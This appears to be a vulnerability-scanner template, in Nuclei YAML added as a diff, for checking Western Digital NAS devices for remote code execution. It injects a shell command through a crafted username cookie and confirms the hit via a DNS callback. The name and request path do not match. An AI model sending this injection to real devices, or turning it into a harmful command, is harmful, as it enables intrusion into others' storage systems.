@@ -1,0 +1,30 @@
+id: poc-yaml-west-nas-users-php-rce
+info:
+  name: Western Digital NAS users.php Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+http:
+  - method: GET
+    path:
+      - "/web/php/upload.php"
+    headers:
+      Cookie: isAdmin=1; username=a" `nslookup {{interactsh-url}}` "
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<status>timeout</status>"
+          - "nslookup"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
